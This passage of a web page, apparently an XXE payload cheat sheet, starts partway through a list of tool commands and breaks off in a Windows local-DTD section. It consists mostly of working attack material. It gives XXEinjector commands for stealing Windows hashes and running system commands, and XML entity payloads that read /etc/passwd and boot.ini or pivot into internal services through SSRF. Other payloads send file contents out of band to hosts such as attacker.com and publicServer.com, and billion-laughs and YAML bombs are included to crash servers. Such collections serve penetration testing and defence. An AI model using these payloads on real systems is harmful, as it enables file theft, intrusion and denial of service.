</span></span><span style=display:flex><span><span style=color:#75715e># Enumerating using direct exploitation:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --file<span style=color:#f92672>=</span>/tmp/req.txt --path<span style=color:#f92672>=</span>/etc --direct<span style=color:#f92672>=</span>UNIQUEMARK
</span></span><span style=display:flex><span><span style=color:#75715e># Enumerating unfiltered ports:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --file<span style=color:#f92672>=</span>/tmp/req.txt --enumports<span style=color:#f92672>=</span>all
</span></span><span style=display:flex><span><span style=color:#75715e># Stealing Windows hashes:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --file<span style=color:#f92672>=</span>/tmp/req.txt --hashes
</span></span><span style=display:flex><span><span style=color:#75715e># Uploading files using Java jar:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --file<span style=color:#f92672>=</span>/tmp/req.txt --upload<span style=color:#f92672>=</span>/tmp/uploadfile.pdf
</span></span><span style=display:flex><span><span style=color:#75715e># Executing system commands using PHP expect:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --file<span style=color:#f92672>=</span>/tmp/req.txt --oob<span style=color:#f92672>=</span>http --phpfilter --expect<span style=color:#f92672>=</span>ls
</span></span><span style=display:flex><span><span style=color:#75715e># Testing for XSLT injection:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --file<span style=color:#f92672>=</span>/tmp/req.txt --xslt
</span></span><span style=display:flex><span><span style=color:#75715e># Log requests only:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --logger --oob<span style=color:#f92672>=</span>http --output<span style=color:#f92672>=</span>/tmp/out.txt
</span></span></code></pre></div></li><li><a href=https://github.com/BuffaloWill/oxml_xxe>oxml_xxe</a> - A tool for embedding XXE/XML exploits into different filetypes (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)<pre tabindex=0><code>ruby server.rb
</code></pre></li><li><a href=https://github.com/whitel1st/docem>docem</a> - Utility to embed XXE and XSS payloads in docx,odt,pptx,etc<pre tabindex=0><code>./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_document -kt -sx docx
./docem.py -s samples/xxe/sample_oxml_xxe_mod1.docx -pm xxe -pf payloads/xxe_special_2.txt -kt -pt per_place
./docem.py -s samples/xss_sample_0.odt -pm xss -pf payloads/xss_tiny.txt -pm per_place
./docem.py -s samples/xxe/sample_oxml_xxe_mod0/ -pm xss -pf payloads/xss_all.txt -pt per_file -kt -sx docx
</code></pre></li><li><a href=http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html>otori</a> - Toolbox intended to allow useful exploitation of XXE vulnerabilities.<pre tabindex=0><code>python ./otori.py --clone --module &#34;G-XXE-Basic&#34; --singleuri &#34;file:///etc/passwd&#34; --module-options &#34;TEMPLATEFILE&#34; &#34;TARGETURL&#34; &#34;BASE64ENCODE&#34; &#34;DOCTYPE&#34; &#34;XMLTAG&#34; --outputbase &#34;./output-generic-solr&#34; --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs 
</code></pre></li></ul><h2 id=detect-the-vulnerability>Detect the vulnerability
<a class=anchor href=#detect-the-vulnerability>#</a></h2><p>Basic entity test, when the XML parser parses the external entities the result should contain &ldquo;John&rdquo; in <code>firstName</code> and &ldquo;Doe&rdquo; in <code>lastName</code>. Entities are defined inside the <code>DOCTYPE</code> element.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!--?xml version=&#34;1.0&#34; ?--&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE replace [&lt;!ENTITY example &#34;Doe&#34;&gt;</span> ]&gt;
</span></span><span style=display:flex><span> <span style=color:#f92672>&lt;userInfo&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;firstName&gt;</span>John<span style=color:#f92672>&lt;/firstName&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;lastName&gt;</span>&amp;example;<span style=color:#f92672>&lt;/lastName&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>&lt;/userInfo&gt;</span>
</span></span></code></pre></div><p>It might help to set the <code>Content-Type: application/xml</code> in the request when sending XML payload to the server.</p><h2 id=exploiting-xxe-to-retrieve-files>Exploiting XXE to retrieve files
<a class=anchor href=#exploiting-xxe-to-retrieve-files>#</a></h2><h3 id=classic-xxe>Classic XXE
<a class=anchor href=#classic-xxe>#</a></h3><p>We try to display the content of the file <code>/etc/passwd</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;</span>]&gt;<span style=color:#f92672>&lt;root&gt;</span>&amp;test;<span style=color:#f92672>&lt;/root&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE data [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ELEMENT data (#ANY)&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;data&gt;</span>&amp;file;<span style=color:#f92672>&lt;/data&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!DOCTYPE foo [  
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;<span style=color:#f92672>&lt;foo&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/foo&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [  
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style=color:#f92672>&lt;foo&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/foo&gt;</span>
</span></span></code></pre></div><p>:warning: <code>SYSTEM</code> and <code>PUBLIC</code> are almost synonym.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [  
</span></span></span><span style=display:flex><span><span style=color:#75715e>  &lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>&lt;!ENTITY xxe SYSTEM &#34;file:///c:/boot.ini&#34; &gt;</span>]&gt;<span style=color:#f92672>&lt;foo&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/foo&gt;</span>
</span></span></code></pre></div><h3 id=classic-xxe-base64-encoded>Classic XXE Base64 encoded
<a class=anchor href=#classic-xxe-base64-encoded>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &#34;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&#34;&gt;</span> %init; ]&gt;<span style=color:#f92672>&lt;foo/&gt;</span>
</span></span></code></pre></div><h3 id=php-wrapper-inside-xxe>PHP Wrapper inside XXE
<a class=anchor href=#php-wrapper-inside-xxe>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=index.php&#34;&gt;</span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;contacts&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;contact&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;name&gt;</span>Jean &amp;xxe; Dupont<span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;phone&gt;</span>00 11 22 33 44<span style=color:#f92672>&lt;/phone&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;address&gt;</span>42 rue du CTF<span style=color:#f92672>&lt;/address&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;zipcode&gt;</span>75000<span style=color:#f92672>&lt;/zipcode&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;city&gt;</span>Paris<span style=color:#f92672>&lt;/city&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/contact&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/contacts&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=http://10.0.0.3&#34; &gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;foo&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/foo&gt;</span>
</span></span></code></pre></div><h3 id=xinclude-attacks>XInclude attacks
<a class=anchor href=#xinclude-attacks>#</a></h3><p>When you can&rsquo;t modify the <strong>DOCTYPE</strong> element use the <strong>XInclude</strong> to target</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;foo</span> <span style=color:#a6e22e>xmlns:xi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XInclude&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;xi:include</span> <span style=color:#a6e22e>parse=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>href=</span><span style=color:#e6db74>&#34;file:///etc/passwd&#34;</span><span style=color:#f92672>/&gt;&lt;/foo&gt;</span>
</span></span></code></pre></div><h2 id=exploiting-xxe-to-perform-ssrf-attacks>Exploiting XXE to perform SSRF attacks
<a class=anchor href=#exploiting-xxe-to-perform-ssrf-attacks>#</a></h2><p>XXE can be combined with the <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery>SSRF vulnerability</a> to target another service on the network.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % xxe SYSTEM &#34;http://internal.service/secret_pass.txt&#34; &gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;foo&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/foo&gt;</span>
</span></span></code></pre></div><h2 id=exploiting-xxe-to-perform-a-deny-of-service>Exploiting XXE to perform a deny of service
<a class=anchor href=#exploiting-xxe-to-perform-a-deny-of-service>#</a></h2><p>:warning: : These attacks might kill the service or the server, do not use them on the production.</p><h3 id=billion-laugh-attack>Billion Laugh Attack
<a class=anchor href=#billion-laugh-attack>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE data [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY a0 &#34;dos&#34; &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY a1 &#34;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY a2 &#34;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY a3 &#34;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY a4 &#34;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&#34;&gt;</span>
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;data&gt;</span>&amp;a4;<span style=color:#f92672>&lt;/data&gt;</span>
</span></span></code></pre></div><h3 id=yaml-attack>Yaml attack
<a class=anchor href=#yaml-attack>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>a: <span style=color:#960050;background-color:#1e0010>&amp;</span>a [&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;,&#34;lol&#34;]
</span></span><span style=display:flex><span>b: <span style=color:#960050;background-color:#1e0010>&amp;</span>b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
</span></span><span style=display:flex><span>c: <span style=color:#960050;background-color:#1e0010>&amp;</span>c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
</span></span><span style=display:flex><span>d: <span style=color:#960050;background-color:#1e0010>&amp;</span>d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
</span></span><span style=display:flex><span>e: <span style=color:#960050;background-color:#1e0010>&amp;</span>e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
</span></span><span style=display:flex><span>f: <span style=color:#960050;background-color:#1e0010>&amp;</span>f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
</span></span><span style=display:flex><span>g: <span style=color:#960050;background-color:#1e0010>&amp;</span>g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
</span></span><span style=display:flex><span>h: <span style=color:#960050;background-color:#1e0010>&amp;</span>h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
</span></span><span style=display:flex><span>i: <span style=color:#960050;background-color:#1e0010>&amp;</span>i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
</span></span></code></pre></div><h2 id=error-based-xxe>Error Based XXE
<a class=anchor href=#error-based-xxe>#</a></h2><p><strong>Payload to trigger the XXE</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE message [
</span></span></span><span style=display:flex><span><span style=color:#75715e>    &lt;!ENTITY % ext SYSTEM &#34;http://attacker.com/ext.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span>    %ext;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;message&gt;&lt;/message&gt;</span>
</span></span></code></pre></div><p><strong>Contents of ext.dtd</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;</span>&#34;&gt;
</span></span><span style=display:flex><span>%eval;
</span></span><span style=display:flex><span>%error;
</span></span></code></pre></div><h2 id=exploiting-blind-xxe-to-exfiltrate-data-out-of-band>Exploiting blind XXE to exfiltrate data out-of-band
<a class=anchor href=#exploiting-blind-xxe-to-exfiltrate-data-out-of-band>#</a></h2><p>Sometimes you won&rsquo;t have a result outputted in the page but you can still extract the data with an out of band attack.</p><h3 id=blind-xxe>Blind XXE
<a class=anchor href=#blind-xxe>#</a></h3><p>The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE root [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % ext SYSTEM &#34;http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&#34;&gt;</span> %ext;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;r&gt;&lt;/r&gt;</span>
</span></span></code></pre></div><p>Send the content of <code>/etc/passwd</code> to &ldquo;<a href=https://www.malicious.com>www.malicious.com</a>&rdquo;, you may receive only the first line.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY callhome SYSTEM &#34;www.malicious.com/?%xxe;&#34;&gt;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;foo&gt;</span>&amp;callhome;<span style=color:#f92672>&lt;/foo&gt;</span>
</span></span></code></pre></div><h3 id=xxe-oob-attack>XXE OOB Attack
<a class=anchor href=#xxe-oob-attack>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE data SYSTEM &#34;http://publicServer.com/parameterEntity_oob.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;data&gt;</span>&amp;send;<span style=color:#f92672>&lt;/data&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>File stored on http://publicServer.com/parameterEntity_oob.dtd
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % file SYSTEM &#34;file:///sys/power/image_size&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;http://publicServer.com/?%file;&#39;&gt;</span>&#34;&gt;
</span></span><span style=display:flex><span>%all;
</span></span></code></pre></div><h3 id=xxe-oob-with-dtd-and-php-filter>XXE OOB with DTD and PHP filter
<a class=anchor href=#xxe-oob-with-dtd-and-php-filter>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE r [
</span></span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ELEMENT r ANY &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % sp SYSTEM &#34;http://127.0.0.1/dtd.xml&#34;&gt;</span>
</span></span><span style=display:flex><span>%sp;
</span></span><span style=display:flex><span>%param1;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;r&gt;</span>&amp;exfil;<span style=color:#f92672>&lt;/r&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>File stored on http://127.0.0.1/dtd.xml
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % param1 &#34;&lt;!ENTITY exfil SYSTEM &#39;http://127.0.0.1/dtd.xml?%data;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div><h3 id=xxe-oob-with-apache-karaf>XXE OOB with Apache Karaf
<a class=anchor href=#xxe-oob-with-apache-karaf>#</a></h3><p>CVE-2018-11788 affecting versions:</p><ul><li>Apache Karaf &lt;= 4.2.1</li><li>Apache Karaf &lt;= 4.1.6</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &#34;http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com&#34;&gt;</span> %dtd;]
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;features</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;my-features&#34;</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://karaf.apache.org/xmlns/features/v1.3.0&#34;</span> <span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;feature</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;deployer&#34;</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;2.0&#34;</span> <span style=color:#a6e22e>install=</span><span style=color:#e6db74>&#34;auto&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/feature&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/features&gt;</span>
</span></span></code></pre></div><p>Send the XML file to the <code>deploy</code> folder.</p><p>Ref. <a href=https://github.com/brianwrf/CVE-2018-11788>brianwrf/CVE-2018-11788</a></p><h2 id=xxe-with-local-dtd>XXE with local DTD
<a class=anchor href=#xxe-with-local-dtd>#</a></h2><p>In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net&#39;&gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;</span>&amp;test;<span style=color:#f92672>&lt;/root&gt;</span>
</span></span></code></pre></div><p>If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE root [
</span></span></span><span style=display:flex><span><span style=color:#75715e>    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///abcxyz/&#34;&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    %local_dtd;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;&lt;/root&gt;</span>
</span></span></code></pre></div><p>Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE root [
</span></span></span><span style=display:flex><span><span style=color:#75715e>    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&lt;!ENTITY % ISOamsa &#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e>        &lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///REPLACE_WITH_FILENAME_TO_READ&#34;&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
</span></span><span style=display:flex><span>        &amp;#x25;eval;
</span></span><span style=display:flex><span>        &amp;#x25;error;
</span></span><span style=display:flex><span>        &#39;&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    %local_dtd;
</span></span><span style=display:flex><span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;&lt;/root&gt;</span>
</span></span></code></pre></div><p><a href=https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md>Other payloads using different DTDs</a></p><h2 id=windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents>Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
<a class=anchor href=#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents>#</a></h2><p>From <a href=https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79>https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79</a></p><h3 id=disclose-local-file>Disclose local file
<a class=anchor href=#disclose-local-file>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE doc [
